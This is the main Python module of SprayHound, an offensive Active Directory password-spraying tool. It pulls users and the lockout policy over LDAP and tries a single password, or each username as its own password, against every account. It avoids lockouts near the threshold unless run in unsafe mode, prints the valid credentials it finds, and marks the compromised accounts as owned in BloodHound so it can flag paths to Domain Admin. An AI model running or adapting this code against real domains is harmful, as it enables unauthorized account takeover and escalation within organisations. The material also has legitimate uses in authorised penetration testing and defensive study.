# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import os
from sprayhound.modules.logger import Logger
from sprayhound.modules.ldapconnection import LdapConnection
from sprayhound.modules.neo4jconnection import Neo4jConnection
from sprayhound.modules.credential import Credential
from sprayhound.utils.utils import *


class SprayHound:
    def __init__(self, users, password, lower, upper, threshold,
                 ldap_options,
                 neo4j_options,
                 logger_options=Logger.Options(),
                 unsafe=False,
                 force=False
                 ):
        self.log = Logger(logger_options)
        self.ldap = LdapConnection(ldap_options, self.log)
        self.neo4j_options = neo4j_options
        self.neo4j = None
        self.credentials = []
        self.users = users
        self.password = password
        self.lower = lower
        self.upper = upper
        self.threshold = threshold
        self.unsafe = unsafe
        self.force = force

    def run(self):
        if not self.ldap.domain:
            return ERROR_LDAP_NOT_FQDN_DOMAIN

        if not (self.ldap.username and self.ldap.password and self.ldap.host):
            if not self.users:
                return ERROR_NO_USER_NO_LDAP
            else:
                if not self.force:
                    self.log.warn("BEWARE ! You are going to test user/pass without providing a valid domain user")
                    self.log.warn("Without a valid domain user, tested account may be locked out as we're not able to determine password policy and bad password count")

                    answer = self.log.input("Continue anyway?", ["y", "n"], "n")
                    if answer == "n":
                        self.log.warn("Wise master. Bye.")
                        sys.exit(0)
                self.get_credentials(lower=self.lower, upper=self.upper)
        else:
            try:
                self.ldap.login()
                self.log.success("Login successful")
            except Exception as e:
                self.log.error("Failed login")
                raise

            try:
                self.ldap.get_password_policy()
                self.log.success("Successfully retrieved password policy (Threshold: {})".format(self.ldap.domain_threshold))
            except Exception as e:
                self.log.error("Failed getting password policy")
                raise

            try:
                self.get_ldap_credentials(lower=self.lower, upper=self.upper)
                self.log.success("Successfully retrieved {} users".format(len(self.credentials)))
            except Exception as e:
                self.log.error("Failed getting ldap credentials")
                raise

        try:
            return self.test_credentials()
        except:
            raise

    def get_credentials(self, lower=False, upper=False):
        self.credentials = [Credential(user) for user in self.users]
        for i in range(len(self.credentials)):
            if self.password:
                self.credentials[i].password = self.password
            elif lower:
                self.credentials[i].password = self.credentials[i].samaccountname.lower()
            elif upper:
                self.credentials[i].password = self.credentials[i].samaccountname.upper()
            else:
                self.credentials[i].password = self.credentials[i].samaccountname

    def get_ldap_credentials(self, lower=False, upper=False):
        if not self.users:
            ret = self.ldap.get_users(self)
            if ret != ERROR_SUCCESS:
                return ret
        else:
            ret = self.ldap.get_users(self, users=self.users, disabled=True)
            if ret != ERROR_SUCCESS:
                return ret

        for i in range(len(self.credentials)):
            if self.password:
                self.credentials[i].set_password(self.password)
            elif lower:
                self.credentials[i].set_password(self.credentials[i].samaccountname.lower())
            elif upper:
                self.credentials[i].set_password(self.credentials[i].samaccountname.upper())
            else:
                self.credentials[i].set_password(self.credentials[i].samaccountname)

        return ERROR_SUCCESS

    def test_credentials(self):
        owned = []

        testing_nb = len([c.is_tested(self.threshold, self.unsafe) for c in self.credentials if c.is_tested(self.threshold, self.unsafe)[0]])

        self.log.success(self.log.colorize("{} users will be tested".format(testing_nb), self.log.GREEN))
        self.log.success(self.log.colorize("{} users will not be tested".format(len(self.credentials) - testing_nb), self.log.YELLOW))
        if not self.force:
            answer = self.log.input("Continue?", ['y', 'n'], 'y')
            if answer != "y":
                self.log.warn("Ok, master. Bye.")
                return ERROR_SUCCESS

        for credential in self.credentials:
            ret = credential.is_valid(self.ldap, self.threshold, self.unsafe)
            if ret == ERROR_SUCCESS:
                self.log.success("[  {}  ] {}".format(self.log.colorize("VALID", self.log.GREEN), self.log.highlight("{} : {}").format(credential.samaccountname, credential.password)))
                owned.append(credential.samaccountname)
            elif ret == ERROR_LDAP_SERVICE_UNAVAILABLE:
                return ret
            elif ret == ERROR_THRESHOLD:
                self.log.debug("[ {} ] {} : {} BadPwdCount: {}, PwdPol: {}".format(self.log.colorize("SKIPPED", self.log.BLUE), credential.samaccountname, credential.password, credential.bad_password_count+1, credential.threshold))
            elif ret == ERROR_LDAP_CREDENTIALS:
                self.log.debug("[{}] {} : {} failed - BadPwdCount: {}, PwdPol: {}".format(self.log.colorize("NOT VALID", self.log.RED), credential.samaccountname, credential.password, credential.bad_password_count+1, credential.threshold))
            else:
                self.log.debug("{} : {} failed - BadPwdCount: {}, PwdPol: {} (Error {}: {})".format(credential.samaccountname, credential.password, credential.bad_password_count+1, credential.threshold, ret[0], ret[1]))


        answer = "n"
        if len(owned) > 1:
            self.log.success("{} user(s) have been owned !".format(len(owned)))
            if not self.force:
                answer = self.log.input("Do you want to set them as 'owned' in Bloodhound ?", ['y', 'n'], 'y')
        elif len(owned) > 0:
            self.log.success("{} user has been owned !".format(len(owned)))
            if not self.force:
                answer = self.log.input("Do you want to set it as 'owned' in Bloodhound ?", ['y', 'n'], 'y')
        if not self.force:
            if answer != "y":
                self.log.warn("Ok, master. Bye.")
                return ERROR_SUCCESS

        self.neo4j = Neo4jConnection(self.neo4j_options)

        for own in owned:
            ret = self.neo4j.set_as_owned(own, self.ldap.domain)
            if ret == ERROR_SUCCESS:
                msg = "Node {} owned!".format(own)
                if self.neo4j.bloodhound_analysis(own, self.ldap.domain) == ERROR_SUCCESS:
                    msg += " [{}PATH TO DA{}]".format('\033[91m', '\033[0m')
                self.log.success(msg)
            elif ret == ERROR_NEO4J_NON_EXISTENT_NODE:
                self.log.warn("Node {} does not exist".format(own))
            else:
                return ret

        return ERROR_SUCCESS


class CLI:
    def __init__(self):
        self.args = get_args()
        self.log_options = Logger.Options(verbosity=self.args.v, nocolor=self.args.nocolor)

        self.log = Logger(self.log_options)

        self.ldap_options = LdapConnection.Options(
            self.args.domain_controller,
            self.args.domain,
            self.args.ldap_user,
            self.args.ldap_pass,
            self.args.ldap_port,
            self.args.ldap_ssl,
            self.args.ldap_page_size
        )
        self.neo4j_options = Neo4jConnection.Options(
            self.args.neo4j_host,
            self.args.neo4j_user,
            self.args.neo4j_pass,
            self.args.neo4j_port,
            self.log
        )

        self.users = []
        if self.args.username:
            self.users = [self.args.username]
        elif self.args.userfile:
            if not os.path.isfile(self.args.userfile):
                sprayhound_exit(self.log, ERROR_USER_FILE_NOT_FOUND)
            with open(self.args.userfile, 'r') as f:
                self.users = [user.strip().lower() for user in f if user.strip() != ""]
        self.password = self.args.password
        self.lower = self.args.lower
        self.upper = self.args.upper
        self.threshold = self.args.threshold

    def run(self):
        try:
            return SprayHound(
                self.users, self.password, self.lower, self.upper, self.threshold,
                ldap_options=self.ldap_options,
                neo4j_options=self.neo4j_options,
                logger_options=self.log_options,
                unsafe=self.args.unsafe,
                force=self.args.force
            ).run()
        except Exception as e:
            self.log.error("An error occurred while executing SprayHound")
            if self.args.v == 2:
                raise
            else:
                return False


def run():
    CLI().run()
